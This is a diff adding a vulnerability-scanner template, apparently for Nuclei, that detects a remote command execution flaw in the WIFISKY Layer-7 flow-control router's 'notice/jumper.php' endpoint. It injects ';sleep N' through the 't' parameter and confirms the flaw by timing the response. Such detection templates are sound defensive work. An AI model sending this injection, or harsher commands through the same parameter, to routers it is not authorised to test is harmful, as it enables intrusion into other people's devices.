@@ -1,0 +1,43 @@
+id: wifisky-7-story-flow-control-router-jumper-rce
+info:
+  name: WIFISKY 7层流控路由器 jumper 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - id: "check-title"
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "WIFISKY 7层流控路由器"
+
+  - id: "check-vulnerability"
+    method: GET
+    path:
+      - "{{BaseURL}}/notice/jumper.php?t=;sleep%20{{t1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
